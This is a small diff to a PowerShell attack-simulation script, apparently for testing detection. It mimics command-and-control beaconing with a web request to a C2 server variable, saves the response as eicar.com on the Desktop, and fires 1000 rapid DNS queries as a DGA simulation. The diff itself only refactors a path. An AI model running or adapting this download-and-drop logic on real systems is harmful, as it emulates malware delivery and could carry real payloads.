@@ -52,7 +52,8 @@ function Simulate-C2Communication {
         $response = Invoke-WebRequest -Uri $c2Server -UseBasicParsing
         Write-Log -Message "C2 server response: $($response.StatusCode)" -Level "DEBUG"
         if ($response.StatusCode -eq 200) {
-            $malwarePath = "$([System.Environment]::GetFolderPath('Desktop'))\eicar.com"
+            $desktopPath = [System.Environment]::GetFolderPath('Desktop')
+            $malwarePath = "${desktopPath}\eicar.com"
             $response.Content | Set-Content -Path $malwarePath -Encoding Byte
             Write-Log -Message "Malware file downloaded and placed on the desktop." -Level "INFO"
         } else {
@@ -68,3 +69,4 @@ Write-Log -Message "Starting DGA simulation..." -Level "INFO"
 Send-DnsQueries -NumQueries 1000 -SleepTime 0.01
 Simulate-C2Communication
 Write-Log -Message "DGA simulation completed." -Level "INFO"
+
